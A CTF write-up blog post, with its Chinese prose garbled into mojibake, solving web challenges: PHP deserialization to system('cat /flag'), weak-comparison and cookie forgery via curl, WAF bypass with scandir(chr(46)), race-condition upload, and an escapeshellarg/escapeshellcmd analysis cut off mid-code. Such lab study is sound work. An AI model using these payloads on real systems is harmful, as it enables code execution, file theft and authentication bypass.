<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>web-é€»è¾‘æ¼æ´ | 24kmagic</title><meta name="author" content="qyt"><meta name="copyright" content="qyt"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="web-é€»è¾‘æ¼æ´åŸºç¡€è„šæœ¬ï¼š 12345678unserialize($_GET[&#x27;x&#x27;]);class A &#123;    public $cmd;    function __destruct() &#123;        system($this-&gt;cmd);    &#125;&#125;     **å¤šä¸ªè¯·æ±‚â€œåŒæ—¶â€è®¿é—®åŒä¸€ä»½èµ„æºï¼Œ &gt; ç¨‹åºå‡è®¾å®ƒä»¬æ˜¯â€œå…ˆå">
<meta property="og:type" content="article">
<meta property="og:title" content="web-é€»è¾‘æ¼æ´">
<meta property="og:url" content="https://2829750658t-svg.github.io/2026/01/21/ctf%E9%A2%98%E8%A7%A3/web/Logic%20Flaw/index.html">
<meta property="og:site_name" content="24kmagic">
<meta property="og:description" content="web-é€»è¾‘æ¼æ´åŸºç¡€è„šæœ¬ï¼š 12345678unserialize($_GET[&#x27;x&#x27;]);class A &#123;    public $cmd;    function __destruct() &#123;        system($this-&gt;cmd);    &#125;&#125;     **å¤šä¸ªè¯·æ±‚â€œåŒæ—¶â€è®¿é—®åŒä¸€ä»½èµ„æºï¼Œ &gt; ç¨‹åºå‡è®¾å®ƒä»¬æ˜¯â€œå…ˆå">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://2829750658t-svg.github.io/img/butterfly-icon.png">
<meta property="article:published_time" content="2026-01-21T11:39:43.000Z">
<meta property="article:modified_time" content="2026-01-23T04:49:21.303Z">
<meta property="article:author" content="qyt">
<meta property="article:tag" content="web-é€»è¾‘æ¼æ´">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://2829750658t-svg.github.io/img/butterfly-icon.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "web-é€»è¾‘æ¼æ´",
  "url": "https://2829750658t-svg.github.io/2026/01/21/ctf%E9%A2%98%E8%A7%A3/web/Logic%20Flaw/",
  "image": "https://2829750658t-svg.github.io/img/butterfly-icon.png",
  "datePublished": "2026-01-21T11:39:43.000Z",
  "dateModified": "2026-01-23T04:49:21.303Z",
  "author": [
    {
      "@type": "Person",
      "name": "qyt",
      "url": "https://2829750658t-svg.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/images/favicon.png"><link rel="canonical" href="https://2829750658t-svg.github.io/2026/01/21/ctf%E9%A2%98%E8%A7%A3/web/Logic%20Flaw/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶å¤±è´¥',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: 'åŠ è½½æ›´å¤š'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'web-é€»è¾‘æ¼æ´',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="google-site-verification" content="xcoxCJdnrLSrFpybmYmk6WSRqz-H1rnZB7BKSjdkWD0" /><meta name="google-site-verification" content="H8Bhbw_EXOKyVq27SUdcn_avXaVqBOWzs2lPJV_HSVw" /><meta name="generator" content="Hexo 8.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">25</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">15</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> æ—¶é—´è½´</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> å‹æƒ…é“¾æ¥</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> å…³äºæˆ‘</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/images/bj2.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">24kmagic</span></a><a class="nav-page-title" href="/"><span class="site-name">web-é€»è¾‘æ¼æ´</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  è¿”å›é¦–é¡µ</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> æ—¶é—´è½´</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> å‹æƒ…é“¾æ¥</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> å…³äºæˆ‘</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">web-é€»è¾‘æ¼æ´</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2026-01-21T11:39:43.000Z" title="å‘è¡¨äº 2026-01-21 19:39:43">2026-01-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2026-01-23T04:49:21.303Z" title="æ›´æ–°äº 2026-01-23 12:49:21">2026-01-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf%E9%A2%98%E8%A7%A3/">ctfé¢˜è§£</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf%E9%A2%98%E8%A7%A3/web/">web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">æµè§ˆé‡:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="web-é€»è¾‘æ¼æ´"><a href="#web-é€»è¾‘æ¼æ´" class="headerlink" title="web-é€»è¾‘æ¼æ´"></a>web-é€»è¾‘æ¼æ´</h2><p>åŸºç¡€è„šæœ¬ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unserialize($_GET[&#x27;x&#x27;]);</span><br><span class="line"></span><br><span class="line">class A &#123;</span><br><span class="line">    public $cmd;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        system($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<?php
class A {
    public $cmd = "cat /flag";
}
echo serialize(new A());







## [æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag

### 1

é¢˜ç›®ï¼šæˆ‘ä¸€å¼€å§‹æ˜¯æƒ³å»æŠŠxffæ”¹æˆå­¦æ ¡çš„ç‰¹å®šå†…ç½‘ipï¼Œå‘ç°æ ¹æœ¬æ²¡æœ‰ç”¨ï¼Œå› ä¸ºä½ ä¸çŸ¥é“ipæ˜¯å•¥å•Š

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Flag</span><br><span class="line"></span><br><span class="line">Flag need your 100000000 money</span><br><span class="line">attention</span><br><span class="line"></span><br><span class="line">If you want to buy the FLAG:</span><br><span class="line">You must be a student from CUIT!!!</span><br><span class="line">You must be answer the correct password!!!</span><br><span class="line"></span><br><span class="line">Only Cuit&#x27;s students can buy the FLAG</span><br><span class="line"></span><br></pre></td></tr></table></figure>



ç”±é¢˜ï¼Œæ²¡æ€è·¯ï¼Œçœ‹æºç 

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">	~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&#x27;password&#x27;])) &#123;</span><br><span class="line">	$password = $_POST[&#x27;password&#x27;];</span><br><span class="line">	if (is_numeric($password)) &#123;</span><br><span class="line">		echo &quot;password can&#x27;t be number&lt;/br&gt;&quot;;</span><br><span class="line">	&#125;elseif ($password == 404) &#123;</span><br><span class="line">		echo &quot;Password Right!&lt;/br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

1.passwordå¼±æ¯”è¾ƒ

å¾ˆçŸ›ç›¾çš„å°±æ˜¯å¯†ç æ˜¯è¦404ï¼Œä½†æ˜¯åˆä¸èƒ½æ˜¯æ•°å­—

è¿™é‡Œå°±è¦ç”¨åˆ°==å¼±æ¯”è¾ƒï¼Œå³å¦‚æœç­‰å¼ä¸¤è¾¹æ˜¯å­—ç¬¦ä¸²å’Œæ•´æ•°ï¼Œä¼šæŠŠå­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ•°å­—å†è¿›è¡Œæ¯”è¾ƒã€‚è¿™å°±å¥½åŠäº†ï¼špassword=404aä¸å°±å¥½äº†

2.ç§‘å­¦è®¡æ•°æ³•

![image-20260101182325159](/images/image-20260101182325159.png)

ä½ å‘ç°ç›´æ¥è¾“å…¥æ•°å­—å®ƒæ˜¾ç¤ºå¤ªé•¿äº†ï¼Œç”¨ç§‘å­¦è®¡æ•°æ³•å°±ok

è¿™é‡Œè¿˜è¦æ³¨æ„çš„ç‚¹ï¼Œå°±æ˜¯ä½ æŠŠåŸæœ¬çš„é‡‘é¢å¡«ä¸Šå»ï¼Œå®ƒä¼šæ˜¾ç¤ºä½ é’±ä¸å¤Ÿï¼Œé‚£ä½ å¤šå¡«ç‚¹ä¸å°±å¥½äº†

3.æ”¹cookieï¼š

æ„é€ è¯·æ±‚ä¸­ï¼Œcookieçš„å‚æ•°æ˜¯-b

![image-20260101182556727](/images/image-20260101182556727.png)

åƒè¾›ä¸‡è‹¦æ”¹å®Œäº†ï¼Œä½†æ˜¯ä»–è¯´ä½ ä¸æ˜¯ä»–çš„å­¦ç”Ÿ

![image-20260101182624105](/images/image-20260101182624105.png)

è¿™é‡ŒæŠ“åŒ…åçœ‹åˆ°äº†user=0ï¼Œå°±è¯´æ˜ä½ ä¸æ˜¯å­¦ç”Ÿå˜›ï¼Œé‚£æŠŠå€¼æ”¹æˆ1ä¸å°±çœŸäº†

æ¥ï¼Œæ”¹cookie



3.æ„é€ è¯·æ±‚

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST &quot;http://03a3f5cd-0bd7-4be5-bb55-829058bd107b.node5.buuoj.cn:81/pay.php&quot; -d &quot;password=404a&amp;money=1e9&quot; -b &quot;user=1&quot;</span><br></pre></td></tr></table></figure>















## [RoarCTF 2019]Easy Calc

### 1



çŸ¥è¯†ç‚¹ï¼š

1. WAF (Web Application Firewall)

2. var_dump()ï¼š

**var_dump()** å‡½æ•°ç”¨äºè¾“å‡ºå˜é‡çš„ç›¸å…³ä¿¡æ¯ã€‚

**var_dump()** å‡½æ•°æ˜¾ç¤ºå…³äºä¸€ä¸ªæˆ–å¤šä¸ªè¡¨è¾¾å¼çš„ç»“æ„ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¡¨è¾¾å¼çš„ç±»å‹ä¸å€¼ã€‚æ•°ç»„å°†é€’å½’å±•å¼€å€¼ï¼Œé€šè¿‡ç¼©è¿›æ˜¾ç¤ºå…¶ç»“æ„ã€‚

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$b = 3.1;</span><br><span class="line">$c = true;</span><br><span class="line">var_dump($b, $c);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">è¾“å‡ºç»“æœä¸ºï¼š</span><br><span class="line"></span><br><span class="line">float(3.1)</span><br><span class="line">bool(true)</span><br></pre></td></tr></table></figure>

![image-20260101194019184](/images/image-20260101194019184.png)





**è¿›å…¥æ­£é¢˜ï¼š**



å…ˆéšä¾¿è¾“å…¥ï¼ŒæŠ“åŒ…å¾—åˆ° `/calc.php?num=1+1`

å†è¾“å…¥ä¸€äº›ç¬¦å·*/'',å‘ç°éƒ½è¢«wafè¿‡æ»¤äº†ï¼Œä¼šæœ‰æç¤ºæ¡†è·³å‡ºæ¥è­¦å‘Š



å¯ä»¥çœ‹çœ‹æºä»£ç 

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$(&#x27;#calc&#x27;).submit(function()&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()), //è¾“å…¥å†…å®¹ä¼šç»è¿‡ç¼–ç æ”¾åˆ°calc.phpé‡Œå»ï¼Œè¿™ä¸åˆšå¥½æ˜¯æˆ‘ä»¬å‰é¢å¾—åˆ°çš„ä¸œè¥¿å—ï¼Œé‚£å°±ç¡®å®šåœ¨è¿™ä¸ªé¡µé¢ä¸‹æ³¨å…¥äº†</span><br><span class="line">        type:&#x27;GET&#x27;,</span><br><span class="line">        success:function(data)&#123;</span><br><span class="line">            $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">        &lt;strong&gt;ç­”æ¡ˆ:&lt;/strong&gt;$&#123;data&#125;</span><br><span class="line">        &lt;/div&gt;`);</span><br><span class="line">        &#125;,</span><br><span class="line">        error:function()&#123;</span><br><span class="line">            alert(&quot;è¿™å•¥?ç®—ä¸æ¥!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    return false;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



ä»”ç»†æ€è€ƒï¼Œæ—¢ç„¶æ˜¯è®¡ç®—å™¨ï¼Œä¸€èˆ¬éƒ½ä¼šç”¨åˆ°evalå‡½æ•°ï¼Œé‚£æˆ‘ä»¬å°±è¾“å…¥ä¸€äº›ä¸œè¥¿è®©php è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆrce)ï¼Œä½†æ˜¯æœ‰äº›ç¬¦å·å¯èƒ½ä¼šè¢«æˆ‘ä»¬ç”¨åˆ°ï¼Œå¯ä»¥è€ƒè™‘ç”¨chr()





æ‰€ä»¥ç›´æ¥æ”¹urlå°±è¡Œäº†ï¼Œä½†æ˜¯å¦‚æœä½ ç›´æ¥è¾“å…¥ num=readfile(æ–‡ä»¶è·¯å¾„),å‘ç°è¢«ç¦æ­¢äº†ï¼ˆå°±æ˜¯æˆ‘å‰é¢è¯´çš„wafï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»•è¿‡waf

![image-20260101193118587](/images/image-20260101193118587.png)



å¯¹äºwafæ¥è¯´ï¼Œä½ è¾“å…¥ï¼š? num=.....

ä»–çœ‹åˆ°çš„æ˜¯`ç©ºæ ¼num`ï¼Œä¸æ˜¯numï¼Œä»–å°±åªè®¤numï¼Œæ‰€ä»¥å°±æ”¾è¿‡ä½ äº†



é‚£ä¹ˆåé¢æ­£å¸¸è·Ÿå‚æ•°å°±è¡Œäº†





![image-20260101185924710](/images/image-20260101185924710.png)

è¿™é‡Œ500æŠ¥é”™è¯´æ˜ä½ å·²ç»è¿›å…¥åç«¯ï¼ˆç»•è¿‡flagäº†ï¼‰ï¼Œåªæ˜¯phpè§£æé”™è¯¯äº†ï¼ˆä½ è¯­æ³•ä¸æ­£ç¡®å˜›ï¼‰









http://node5.buuoj.cn:27002/calc.php?%20num=var_dump(scandir(chr(46)))

http://node5.buuoj.cn:27002/calc.php?%20num=var_dump(scandir(char(46)))

46æ˜¯. 

47æ˜¯/



![image-20260101190705612](/images/image-20260101190705612.png)







![image-20260101190756691](/images/image-20260101190756691.png)



æ‰¾åˆ°äº†ï¼Œç°åœ¨æˆ‘ä»¬è¦

è¯»å–ï¼š

file_get_contents()

readfile()

highlight_file()

ä»»é€‰





è¿™é‡Œå› ä¸ºæ²¡æœ‰è¾“å…¥è·¯å¾„ï¼Œåªæ˜¯è¾“å…¥äº†æ–‡ä»¶åï¼Œæ‰€ä»¥é”™äº†

![image-20260101191116410](/images/image-20260101191116410.png)



![image-20260101192942012](/images/image-20260101192942012.png)



## 15 ç¬¬åäº”ç«  å½’çœŸå…³Â·ç«æ—¶å‡€é­”

## 

æ–‡ä»¶ä¸Šä¼ ï¼Ÿå…¶å®æ˜¯ç«äº‰æ¼æ´

è®¨åŒè¿™é“é¢˜ç›®ã€‚ä»€ä¹ˆç«äº‰ï¼Ÿï¼Ÿæ¡ä»¶ç«äº‰

1.ä¸Šä¼ phpè™½ç„¶å¤±è´¥ï¼Œä½†æˆ‘ä»¬æŠ“åŒ…å¯ä»¥å‘é€å‡ºæ•°æ¬¡

2.åŒæ—¶æŠ“åŒ…æ‰“å¼€uploads/å¯¹åº”æ–‡ä»¶åï¼Œå‘é€æ— æ•°æ¬¡

3.è§‚å¯Ÿå“åº”ï¼ŒæˆåŠŸä¸Šä¼ åå°±ok



##  **ç«æ€æ¡ä»¶ï¼ˆRace Conditionï¼‰**

### ä»€ä¹ˆæ˜¯ Race Conditionï¼Ÿ

> **å¤šä¸ªè¯·æ±‚â€œåŒæ—¶â€è®¿é—®åŒä¸€ä»½èµ„æºï¼Œ
> ç¨‹åºå‡è®¾å®ƒä»¬æ˜¯â€œå…ˆåæ‰§è¡Œâ€ï¼Œ
> ä½†ç°å®ä¸­å®ƒä»¬å‘ç”Ÿäº†â€œæ—¶é—´é‡å â€ï¼Œ
> å¯¼è‡´é€»è¾‘è¢«æ‰“ä¹±ã€‚**

ä¸€å¥è¯ç‰ˆï¼š

> **ç¨‹åºæ²¡åŠ é”ï¼Œä½ æ¥æŠ¢æ—¶é—´ã€‚**



Aï¼šåˆšæŠŠçº¸æ”¾ä¸‹
Bï¼šæ‰‹åˆšä¼¸è¿‡æ¥æƒ³åˆ æ‰
æˆ‘ï¼šçœ¼ç›å·²ç»çœ‹åˆ°äº†



ğŸ‘‰ **â€œæ–‡ä»¶å­˜åœ¨ä½†è¿˜æ²¡è¢«åˆ â€çš„æçŸ­æ—¶é—´çª—å£**
 å°±æ˜¯æ¼æ´çª—å£ã€‚











## [BUUCTF 2018]Online Tool

### 1



| å­—ç¬¦ç±»å‹       | å…·ä½“å­—ç¬¦                                                     | `escapeshellcmd()`çš„å¤„ç†æ–¹å¼           |      |
| -------------- | ------------------------------------------------------------ | -------------------------------------- | ---- |
| shell ç‰¹æ®Šå­—ç¬¦ | `& ;                | $ ( ) ` * ? < >`                       | åŠ  `\` è½¬ä¹‰ï¼ˆæ¯”å¦‚ `&`â†’`\&`ï¼‰ |                                        |      |
| æ™®é€šå­—ç¬¦       | `' " / . æ•°å­— å­—æ¯`                                          | ä¸è½¬ä¹‰ï¼›å¦‚æœå‰é¢æœ‰`\`ï¼Œç›´æ¥åˆ `\`ç•™å­—ç¬¦ |      |









<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// ç¬¬ä¸€æ­¥ï¼šä¼ªé€ å®¢æˆ·ç«¯IPï¼ˆå…³é”®é“ºå«ï¼‰</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è§£é‡Šï¼š</span></span><br><span class="line"><span class="comment">// HTTP_X_FORWARDED_FORæ˜¯è¯·æ±‚å¤´ï¼Œå¯ä¼ªé€ ï¼ˆæ¯”å¦‚ç”¨Burp/PostManæ”¹ï¼‰ï¼›</span></span><br><span class="line"><span class="comment">// è¿™è¡Œä»£ç çš„æ„æ€æ˜¯ï¼šå¦‚æœæœ‰è¿™ä¸ªè¯·æ±‚å¤´ï¼Œå°±æŠŠå®¢æˆ·ç«¯çœŸå®IPæ›¿æ¢æˆè¿™ä¸ªå¤´çš„å€¼ï¼›</span></span><br><span class="line"><span class="comment">// ç›®çš„ï¼šåé¢ç”Ÿæˆæ²™ç®±ç›®å½•ä¾èµ–REMOTE_ADDRï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ”¹è¿™ä¸ªè¯·æ±‚å¤´æ§åˆ¶æ²™ç®±åç§°ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¬¬äºŒæ­¥ï¼šåˆ¤æ–­æ˜¯å¦ä¼ äº†hostå‚æ•°</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); <span class="comment">// æ²¡ä¼ hostçš„è¯ï¼Œæ˜¾ç¤ºå½“å‰ä»£ç æºç </span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// ç¬¬ä¸‰æ­¥ï¼šå¤„ç†hostå‚æ•°ï¼ˆçœ‹ä¼¼è¿‡æ»¤ï¼Œå®åˆ™æœ‰å‘ï¼‰</span></span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];          <span class="comment">// è·å–URLé‡Œçš„?host=xxxå‚æ•°</span></span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);  <span class="comment">// æŠŠå‚æ•°ç”¨å•å¼•å·åŒ…è£¹+è½¬ä¹‰å•å¼•å·ï¼ˆæ¯”å¦‚æŠŠ&#x27;å˜æˆ\&#x27;ï¼‰   æ³¨æ„é¡ºåºï¼ï¼ï¼1</span></span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);  <span class="comment">// 